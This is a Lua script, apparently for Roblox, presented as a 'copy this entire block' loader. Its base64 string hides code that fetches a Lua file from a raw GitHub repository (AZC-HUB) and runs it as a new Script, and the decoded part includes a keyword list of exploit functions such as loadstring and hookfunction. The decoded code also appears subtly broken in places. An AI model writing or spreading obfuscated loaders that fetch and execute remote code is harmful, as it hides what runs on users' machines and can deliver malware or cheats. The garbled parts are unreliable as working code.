-- Base64 encoded loader - Copy this entire block
local encoded = "bG9jYWwgTD17fUwuUz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZjdXhlcnJkZXYvQVpDLUhVQi9yZWZzL2hlYWRzL21haW4vVGhlRk9SZ2UubHVhIkwuRT10cnVlIEwuRD1mYWxzZSBNTD0zIEwuVD0xMCBsb2NhbCBmdW5jdGlvbiBJKFApaWYgbm90IFAgb3IgdHlwZShQKX49InN0cmluZyJ0aGVuIHJldHVybiBmYWxzZSwiSW52YWxpZCBzY3JpcHQgc291cmNlImVuZCBsb2NhbCBXPXsiZ2V0ZmVudiIsInNldGZlbnYiLCJsb2Fkc3RyaW5nIiwiZG9maWxlIiwid3JpdGVmaWxlIiwicmVhZGZpbGUiLCJnZXRodWkiLCJnZXRnZW52IiwiaG9va2Z1bmN0aW9uIiwicmVwbGFjZWNsb3N1cmUifWZvciBfLFEgaW4gaXBhaXJzKFcpZG8gaWYgc3RyaW5nLmZpbmQoc3RyaW5nLmxvd2VyKFApLFEpdGhlbiByZXR1cm4gZmFsc2UsIlNjcmlwdCBjb250YWlucyBwb3RlbnRpYWxseSB1bnNhZmUgY29kZTogIi4uUSBlbmQgZW5kIHJldHVybiB0cnVlLCJTY3JpcHQgcGFzc2VkIHZhbGlkYXRpb24iZW5kIGxvY2FsIGZ1bmN0aW9uIEcoUil7bG9jYWwgUyxUPXBjYWwoZnVuY3Rpb24oKXJldHVybiBnYW1lOkh0dHBHZXRBc3luYyhSKWVuZClpZiBTIHRoZW4gcmV0dXJuIFQgZWxzZSB3YXJuKCJIVFRQIHJlcXVlc3QgZmFpbGVkOiIsVClyZXR1cm4gbmlsIGVuZCBlbmQgZnVuY3Rpb24gTC5Mb2FkKClpZiBub3QgTC5FIHRoZW4gd2FybigiU2NyaXB0TG9hZGVyIGlzIGRpc2FibGVkIilyZXR1cm4gZmFsc2UgZW5kIHByaW50KCJbU2NyaXB0TG9hZGVyXSBBdHRlbXB0aW5nIHRvIGxvYWQgc2NyaXB0IGZyb206IixMLlMpZm9yIEk9MSxNTCBkbyBwcmludCgiW1NjcmlwdExvYWRlcl0gQXR0ZW1wdCIsSSwib2YiLE1MKWxvY2FsIEo9RyhMLlMpaWYgSiB0aGVuIGxvY2FsIEssTj1JKEopZWlmIEsgdGhlbiBwcmludCgiW1NjcmlwdExvYWRlcl0gU2NyaXB0IHZhbGlkYXRpb24gc3VjY2Vzc2Z1bCIpbG9jYWwgTz1JbnN0YW5jZS5uZXcoIlNjcmlwdCIpTy5OYW1lPSJMb2FkZWRTY3JpcHRfIi4ub3MudGltZSgpTy5Tb3VyY2U9Sk8uUGFyZW50PXNjcmlwdC5QYXJlbnQgb3Igd29ya3NwYWNlIHByaW50KCJbU2NyaXB0TG9hZGVyXSBTY3JpcHQgbG9hZGVkIHN1Y2Nlc3NmdWxseSEiKXJldHVybiBPIGVsc2Ugd2FybigiW1NjcmlwdExvYWRlcl0gU2NyaXB0IHZhbGlkYXRpb24gZmFpbGVkOiIsTlswXSlSZXR1cm4gZmFsc2UgZW5kIGVsc2Ugd2FybigiW1NjcmlwdExvYWRlcl0gRmFpbGVkIHRvIGZldGNoIHNjcmlwdCwgcmV0cnlpbmcuLi4iKVdUPTIgZW5kIGVuZCB3YXJuKCJbU2NyaXB0TG9hZGVyXSBGYWlsZWQgdG8gbG9hZCBzY3JpcHQgYWZ0ZXIiLE1MLCJhdHRlbXB0cyIpcmV0dXJuIGZhbHNlIGVuZCBmdW5jdGlvbiBMOlNldFVSTChVKWlmIHR5cGUoVSk9PSJzdHJpbmciYW5kIHN0cmluZy5maW5kKFUsIl5odHRwcz86Ly8iKXRoZW4gTC5TPVUgcHJpbnQoIltTY3JpcHRMb2FkZXJdIFVSTCB1cGRhdGVkIHRvOiIsVSlSZXR1cm4gdHJ1ZSBlbHNlIHdhcm4oIltTY3JpcHRMb2FkZXJdIEludmFsaWQgVVJMIHByb3ZpZGVkIilyZXR1cm4gZmFsc2UgZW5kIGVuZCBmdW5jdGlvbiBMOkVuYWJsZSgpTC5FPXRydWUgcHJpbnQoIltTY3JpcHRMb2FkZXJdIEVuYWJsZWQiKWVuZCBmdW5jdGlvbiBMOkRpc2FibGUoKUwuRT1mYWxzZSBwcmludCgiW1NjcmlwdExvYWRlcl0gRGlzYWJsZWQiKWVuZCBmdW5jdGlvbiBMOkluaXQoVilpZiBWIHRoZW4gaWYgVi5VUkwgdGhlbiBMOlNldFVSTChWLlVSTCllbmQgaWYgVi5FbmFibGVkfj1uaWwgdGhlbiBMLkU9Vi5FbmFibGVkIGVuZCBpZiBWLkRlYnVnTW9kZX49bmlsIHRoZW4gTC5EPVYuRGVidWdNb2RlIGVuZCBlbmQgcHJpbnQoIltTY3JpcHRMb2FkZXJdIEluaXRpYWxpemVkIilyZXR1cm4gTCBlbmQgaWYgc2NyaXB0OklzQSgiU2NyaXB0Iil0aGVuIEw6SW5pdCgpZW5kIHJldHVybiBM"

-- Decoder and loader
local function decodeBase64(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Load the obfuscated code
local decoded = decodeBase64(encoded)
local loaderFunc, errorMsg = loadstring(decoded)
if loaderFunc then
    local Loader = loaderFunc()
    return Loader
else
    error("Failed to load obfuscated script: " .. tostring(errorMsg))
end
